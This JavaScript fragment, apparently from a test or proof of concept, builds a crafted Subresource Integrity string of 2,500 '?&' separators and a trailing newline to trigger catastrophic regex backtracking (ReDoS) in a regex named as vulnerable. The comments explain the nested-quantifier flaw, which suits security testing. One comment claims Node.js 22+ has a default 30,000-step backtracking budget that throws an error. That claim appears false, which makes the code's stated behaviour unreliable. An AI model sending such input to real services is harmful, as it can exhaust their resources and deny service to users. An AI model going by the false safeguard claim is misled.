   // The vulnerable regex contains nested quantifiers: `(?:\?[\\x21-\\x7E]*)*`.
   // When the engine processes a long sequence of overlapping separators (like '?&'),
   // it must explore all possible ways to partition those characters between 
   // the inner `*` and outer `*` quantifiers. This results in O(2^n) complexity.
   const separatorCount = 2500;
   const maliciousOptions = Array(separatorCount).fill('?&').join('');

   // SRI format: algorithm-base64hash?key=value&option=...
   // Appending a trailing control character (`\n`) guarantees the final `$` anchor 
   // will fail, forcing the engine to backtrack across EVERY ambiguous partition path.
   const craftedSRI = `sha256-AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA==${maliciousOptions}\n`;

   console.log(`Triggering ReDoS with ${separatorCount} nested separators...`);

   // This will exhaust V8's backtracking budget (30,000 by default in Node.js 22+)
   // and throw a RangeError/InternalError. The failure propagates as requested.
   VULNERABLE_STRICT_SRI_REGEX.test(craftedSRI);
